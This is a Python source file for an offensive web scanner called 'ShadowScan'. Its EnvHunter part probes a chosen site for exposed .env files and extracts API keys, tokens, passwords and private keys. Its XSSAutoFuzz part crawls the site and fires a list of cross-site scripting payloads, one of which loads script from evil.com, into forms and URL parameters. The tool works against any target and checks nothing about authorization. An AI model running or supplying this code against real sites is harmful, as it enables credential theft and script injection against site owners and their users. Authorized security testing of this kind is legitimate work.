import os
import re
import sys
import json
import time
import requests
import threading
import argparse
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
MAX_THREADS = 20
TIMEOUT = 10
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '\'"><script>alert(1)</script>',
    'javascript:alert(1)',
    '"><script>alert(1)</script>',
    '"><iframe src=javascript:alert(1)>',
    '"><body onload=alert(1)>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '%22%3E%3Cscript%3Ealert(1)%3C/script%3E',
    '"><script>prompt(1)</script>',
    '"><script>confirm(1)</script>',
    '<script src=//evil.com/xss.js></script>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<input type=image src=x onerror=alert(1)>',
    '<body style="background-image:url(javascript:alert(1))">',
    '<iframe srcdoc="<script>alert(1)</script>">'
]

class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

class EnvHunter:
    def __init__(self, target_url, verbose=False):
        self.target_url = target_url
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': USER_AGENT})
        self.common_secrets = [
            r'API[_-]?KEY',
            r'SECRET[_-]?KEY',
            r'PASSWORD',
            r'DATABASE[_-]?URL',
            r'AWS[_-]?ACCESS[_-]?KEY',
            r'AWS[_-]?SECRET[_-]?KEY',
            r'TWILIO[_-]?API[_-]?KEY',
            r'STRIPE[_-]?API[_-]?KEY',
            r'SLACK[_-]?TOKEN',
            r'GITHUB[_-]?TOKEN',
            r'JWT[_-]?SECRET',
            r'ADMIN[_-]?PASSWORD',
            r'CREDENTIALS',
            r'PRIVATE[_-]?KEY',
            r'ENCRYPTION[_-]?KEY'
        ]
        self.common_paths = [
            '/.env',
            '/config/.env',
            '/app/.env',
            '/src/.env',
            '/api/.env',
            '/v1/.env',
            '/v2/.env',
            '/admin/.env',
            '/backend/.env',
            '/env',
            '/config/env',
            '/app/config/.env',
            '/src/config/.env',
            '/api/config/.env',
            '/.env.bak',
            '/.env.local',
            '/.env.dev',
            '/.env.prod',
            '/.env.test',
            '/.env.example',
            '/.env.sample',
            '/env.example',
            '/env.sample',
            '/config/env.example',
            '/config/env.sample'
        ]

    def log(self, message, color=Color.WHITE):
        if self.verbose:
            print(f"{color}[EnvHunter]{Color.RESET} {message}")

    def check_url(self, url):
        try:
            response = self.session.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                return response
        except requests.RequestException as e:
            self.log(f"Error checking {url}: {e}", Color.RED)
        return None

    def find_env_files(self):
        found_files = []
        base_url = self.target_url.rstrip('/')
        
        for path in self.common_paths:
            url = base_url + path
            self.log(f"Checking {url}", Color.YELLOW)
            response = self.check_url(url)
            if response:
                found_files.append(url)
                self.log(f"Found .env file at {url}", Color.GREEN)
        
        return found_files

    def extract_secrets(self, content):
        secrets = []
        for pattern in self.common_secrets:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                line_start = content.rfind('\n', 0, match.start()) + 1
                line_end = content.find('\n', match.end())
                line = content[line_start:line_end].strip()
                secrets.append((match.group(), line))
        
        return secrets

    def scan(self):
        self.log(f"Starting EnvHunter scan on {self.target_url}", Color.CYAN)
        found_files = self.find_env_files()
        
        results = {}
        for env_file in found_files:
            response = self.check_url(env_file)
            if response:
                secrets = self.extract_secrets(response.text)
                if secrets:
                    results[env_file] = secrets
                    self.log(f"Found {len(secrets)} secrets in {env_file}", Color.GREEN)
        
        return results

class XSSAutoFuzz:
    def __init__(self, target_url, verbose=False, threads=MAX_THREADS):
        self.target_url = target_url
        self.verbose = verbose
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': USER_AGENT})
        self.vulnerable_params = []
        self.vulnerable_urls = []
        self.scanned_forms = set()
        self.scanned_urls = set()
        self.lock = threading.Lock()

    def log(self, message, color=Color.WHITE):
        if self.verbose:
            print(f"{color}[XSSAutoFuzz]{Color.RESET} {message}")

    def is_reflected(self, response, payload):
        # Check if payload is reflected in response
        decoded_payload = payload.lower().replace(' ', '').replace('"', '').replace("'", "")
        response_text = response.text.lower().replace(' ', '').replace('"', '').replace("'", "")
        
        # Basic reflection check
        if decoded_payload in response_text:
            return True
        
        # Check for encoded versions
        if quote(payload).lower() in response_text:
            return True
        
        # Check for common XSS filter bypasses
        variations = [
            payload.replace('<', '%3C'),
            payload.replace('>', '%3E'),
            payload.replace(' ', '%20'),
            payload.replace('"', '%22'),
            payload.replace("'", '%27'),
            payload.replace('/', '%2F'),
            payload.replace('=', '%3D')
        ]
        
        for variation in variations:
            if variation.lower() in response_text:
                return True
        
        return False

    def extract_forms(self, url):
        try:
            response = self.session.get(url, timeout=TIMEOUT)
            forms = []
            
            # Parse HTML forms
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_details = {
                    'action': form.get('action'),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all('input'):
                    input_details = {
                        'name': input_tag.get('name'),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    if input_details['name']:
                        form_details['inputs'].append(input_details)
                
                forms.append(form_details)
            
            return forms
        
        except Exception as e:
            self.log(f"Error extracting forms from {url}: {e}", Color.RED)
            return []

    def fuzz_form(self, url, form_details):
        form_url = urljoin(url, form_details['action']) if form_details['action'] else url
        form_method = form_details['method']
        
        # Skip if already scanned
        with self.lock:
            if form_url in self.scanned_forms:
                return
            self.scanned_forms.add(form_url)
        
        self.log(f"Fuzzing form at {form_url}", Color.YELLOW)
        
        for payload in XSS_PAYLOADS:
            data = {}
            for input_field in form_details['inputs']:
                if input_field['type'] in ['text', 'search', 'email', 'password', 'url', 'hidden']:
                    data[input_field['name']] = payload
                else:
                    data[input_field['name']] = input_field['value']
            
            try:
                if form_method == 'get':
                    response = self.session.get(form_url, params=data, timeout=TIMEOUT)
                else:
                    response = self.session.post(form_url, data=data, timeout=TIMEOUT)
                
                if self.is_reflected(response, payload):
                    with self.lock:
                        self.vulnerable_urls.append({
                            'url': form_url,
                            'payload': payload,
                            'method': form_method.upper(),
                            'params': data
                        })
                    self.log(f"Potential XSS found in form at {form_url} with payload: {payload}", Color.GREEN)
            
            except Exception as e:
                self.log(f"Error fuzzing form at {form_url}: {e}", Color.RED)

    def fuzz_url_params(self, url):
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = parsed_url.query.split('&') if parsed_url.query else []
        
        # Skip if already scanned
        with self.lock:
            if base_url in self.scanned_urls:
                return
            self.scanned_urls.add(base_url)
        
        self.log(f"Fuzzing URL parameters at {base_url}", Color.YELLOW)
        
        for payload in XSS_PAYLOADS:
            try:
                # Fuzz each parameter individually
                for param in query_params:
                    if '=' in param:
                        param_name, param_value = param.split('=', 1)
                        fuzzed_params = query_params.copy()
                        fuzzed_params[fuzzed_params.index(param)] = f"{param_name}={payload}"
                        fuzzed_query = '&'.join(fuzzed_params)
                        fuzzed_url = f"{base_url}?{fuzzed_query}"
                        
                        response = self.session.get(fuzzed_url, timeout=TIMEOUT)
                        if self.is_reflected(response, payload):
                            with self.lock:
                                self.vulnerable_urls.append({
                                    'url': fuzzed_url,
                                    'payload': payload,
                                    'method': 'GET',
                                    'param': param_name
                                })
                            self.log(f"Potential XSS found in parameter {param_name} at {base_url} with payload: {payload}", Color.GREEN)
                
                # Fuzz all parameters together
                fuzzed_params = [f"{param.split('=')[0]}={payload}" if '=' in param else param for param in query_params]
                fuzzed_query = '&'.join(fuzzed_params)
                fuzzed_url = f"{base_url}?{fuzzed_query}"
                
                response = self.session.get(fuzzed_url, timeout=TIMEOUT)
                if self.is_reflected(response, payload):
                    with self.lock:
                        self.vulnerable_urls.append({
                            'url': fuzzed_url,
                            'payload': payload,
                            'method': 'GET',
                            'params': 'ALL'
                        })
                    self.log(f"Potential XSS found in multiple parameters at {base_url} with payload: {payload}", Color.GREEN)
            
            except Exception as e:
                self.log(f"Error fuzzing URL parameters at {base_url}: {e}", Color.RED)

    def crawl_and_fuzz(self, url, depth=2):
        if depth <= 0:
            return
        
        try:
            response = self.session.get(url, timeout=TIMEOUT)
            
            # Extract links from page
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            links = [urljoin(url, a['href']) for a in soup.find_all('a', href=True)]
            
            # Process each link
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                
                for link in links:
                    if any(ext in link.lower() for ext in ['.jpg', '.png', '.gif', '.pdf', '.css', '.js']):
                        continue
                    
                    if link not in self.scanned_urls:
                        futures.append(executor.submit(self.fuzz_url_params, link))
                        futures.append(executor.submit(self.process_page, link, depth-1))
                
                for future in as_completed(futures):
                    future.result()
        
        except Exception as e:
            self.log(f"Error crawling {url}: {e}", Color.RED)

    def process_page(self, url, depth):
        self.fuzz_url_params(url)
        
        forms = self.extract_forms(url)
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(lambda form: self.fuzz_form(url, form), forms)
        
        if depth > 0:
            self.crawl_and_fuzz(url, depth-1)

    def scan(self):
        self.log(f"Starting XSSAutoFuzz scan on {self.target_url}", Color.CYAN)
        
        # Start with the target URL
        self.process_page(self.target_url, depth=2)
        
        # Crawl and fuzz additional pages
        self.crawl_and_fuzz(self.target_url, depth=2)
        
        return self.vulnerable_urls

def print_banner():
    banner = f"""
{Color.MAGENTA}
 _______           _______  ______   _______           _______  _______  _______  _       
(  ____ \|\     /|(  ___  )(  __  \ (  ___  )|\     /|(  ____ \(  ____ \(  ___  )( (    /|
| (    \/| )   ( || (   ) || (  \  )| (   ) || )   ( || (    \/| (    \/| (   ) ||  \  ( |
| (_____ | (___) || (___) || |   ) || |   | || | _ | || (_____ | |      | (___) ||   \ | |
(_____  )|  ___  ||  ___  || |   | || |   | || |( )| |(_____  )| |      |  ___  || (\ \) |
      ) || (   ) || (   ) || |   ) || |   | || || || |      ) || |      | (   ) || | \   |
/\____) || )   ( || )   ( || (__/  )| (___) || () () |/\____) || (____/\| )   ( || )  \  |
\_______)|/     \||/     \|(______/ (_______)(_______)\_______)(_______/|/     \||/    )_)
{Color.RESET}
{Color.YELLOW}By Lenny{Color.RESET}
"""
    print(banner)

def save_results(results, filename):
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n{Color.GREEN}[+] Results saved to {filename}{Color.RESET}")
    except Exception as e:
        print(f"\n{Color.RED}[-] Error saving results: {e}{Color.RESET}")

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description="ShadowScan - Advanced Web Vulnerability Scanner")
    parser.add_argument("target", help="Target URL to scan")
    parser.add_argument("-e", "--env", action="store_true", help="Run EnvHunter scan for .env files and secrets")
    parser.add_argument("-x", "--xss", action="store_true", help="Run XSSAutoFuzz scan for XSS vulnerabilities")
    parser.add_argument("-a", "--all", action="store_true", help="Run all scans")
    parser.add_argument("-t", "--threads", type=int, default=MAX_THREADS, help=f"Maximum threads to use (default: {MAX_THREADS})")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    if not any([args.env, args.xss, args.all]):
        parser.error("No scan type specified. Use -e, -x, or -a")
    
    results = {}
    
    if args.all or args.env:
        env_hunter = EnvHunter(args.target, args.verbose)
        env_results = env_hunter.scan()
        results['env'] = env_results
        
        print(f"\n{Color.CYAN}[*] EnvHunter Results:{Color.RESET}")
        if env_results:
            for file, secrets in env_results.items():
                print(f"\n{Color.GREEN}[+] Found .env file: {file}{Color.RESET}")
                for secret_type, secret_line in secrets:
                    print(f"  {Color.YELLOW}- {secret_type}: {secret_line}{Color.RESET}")
        else:
            print(f"{Color.RED}[-] No .env files or secrets found{Color.RESET}")
    
    if args.all or args.xss:
        xss_fuzzer = XSSAutoFuzz(args.target, args.verbose, args.threads)
        xss_results = xss_fuzzer.scan()
        results['xss'] = xss_results
        
        print(f"\n{Color.CYAN}[*] XSSAutoFuzz Results:{Color.RESET}")
        if xss_results:
            for vuln in xss_results:
                print(f"\n{Color.GREEN}[+] Potential XSS found at: {vuln['url']}{Color.RESET}")
                print(f"  {Color.YELLOW}- Method: {vuln['method']}{Color.RESET}")
                print(f"  {Color.YELLOW}- Payload: {vuln['payload']}{Color.RESET}")
                if 'param' in vuln:
                    print(f"  {Color.YELLOW}- Vulnerable parameter: {vuln['param']}{Color.RESET}")
        else:
            print(f"{Color.RED}[-] No XSS vulnerabilities found{Color.RESET}")
    
    if args.output:
        save_results(results, args.output)

if __name__ == "__main__":
    main()
